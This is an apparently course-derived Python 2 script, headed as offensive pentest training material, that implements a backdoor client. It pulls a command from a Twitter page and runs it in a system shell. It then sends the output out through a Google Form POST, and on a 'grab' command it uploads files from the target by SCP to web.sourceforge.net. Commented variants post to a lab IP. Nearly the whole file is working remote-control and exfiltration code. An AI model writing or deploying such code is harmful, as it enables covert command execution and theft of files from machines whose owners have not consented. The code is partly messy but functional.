# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2


# Basic TCP Client

import socket                     # For Building TCP Connection
import subprocess                 # To start the shell in the system
import requests   # To install requests library, just type on the CMD:  pip install requests
import urllib
import time
import paramiko     # pip install paramiko
import scp   
import os
from BeautifulSoup import BeautifulSoup
url = "https://twitter.com/LINK"

#url = raw_input("Enter the URL ")
ht= urllib.urlopen(url)
html_page = ht.read()
b_object = BeautifulSoup(html_page)



data2 = b_object.body.find('div',attrs={'class' : 'js-tweet-text-container'})

print data2.text



# url = 'https://docs.google.com/forms/LINKHERE/formResponse' # please replace the URL with your own google form :D

# form_data = {'entry.1287060735':"takie se"}
# r = requests.post(url, data=form_data)


# def connect():

            # command =  data2.text                                
            # CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            # print( CMD.stdout.read()  ) # show the result
            # print( CMD.stderr.read()  ) # show the error -if any-, such as syntax error
            # komenda = CMD.stdout.read()
            # print(komenda)
            # url = 'https://docs.google.com/forms/LINKHERE/formResponse' # please replace the URL with your own google form :D

            # form_data = {'entry.number': "Here is a {}".format(komenda)}
            # r = requests.post(url, data=form_data)

# def connect():
    # while True:                                                 # keep receiving commands from the Kali machine
        # command =  data2.text                                 # read the first KB of the tcp socket
        
        # if 'terminate' in command:                  # if we got termiante order from the attacker, close the socket and break the loop
            # break 
        
        # else:                                      # otherwise, we pass the received command to a shell process
            
            # CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            # print( CMD.stdout.read()  ) # send back the result
            # print( CMD.stderr.read()  ) # send back the error -if any-, such as syntax error
def connect():
    command =  data2.text
    while True:                                                 # keep receiving commands from the Kali machine
                                         # read the first KB of the tcp socket
        
        if 'terminate' in command:                  # if we got termiante order from the attacker, close the socket and break the loop
            break 
        elif 'grab' in command:
           grab,path=command.split('*')
           if os.path.exists(path):
            #url = 'http://10.10.10.100/store'
            files = {'file': open(path, 'rb')}
            print(path)
            #print(files)
            # r = requests.post(url, files=files)
            ssh_client = paramiko.SSHClient()  # creating an ssh_client instance using paramiko sshclient class
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh_client.connect("web.sourceforge.net", username="USERNAME", password="PASSWORD") #Authenticate ourselves to the sourceforge server
            print '[+] Authenticating against web.sourceforge.net ...'                                  #please use your own login credentials :D
            scp_conn = scp.SCPClient(ssh_client.get_transport())  #after a sucessful authentication the ssh session id will be passed into SCPClient function
            #scp_conn.put('C:\\Users\\test\\Desktop\\password.txt') # upload to file( in this case it's password.txt) that we want to grab from the target to /root directroy
            scp_conn.put(path)
            print '[+] File is uploaded '
            scp_conn.close()
            print '[+] Closing the socket'
            break
          # else:
            # post_response = requests.post(url='http://10.10.10.100', data='[-] Not able to find the file !' )
        else:                                      # otherwise, we pass the received command to a shell process
            
            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            #print( CMD.stdout.read()  ) # send back the result
            #print( CMD.stderr.read()  ) # send back the error -if any-, such as syntax error		
            komenda = CMD.stdout.read()
            print(komenda)
            #print unicode(komenda)
            url = 'https://docs.google.com/forms/LINKHERE/formResponse' # please replace the URL with your own google form :D

            form_data = {'entry.number': "Here is a {}".format(komenda)}
            r = requests.post(url, data=form_data)		
            break

def main ():
    connect()
main()
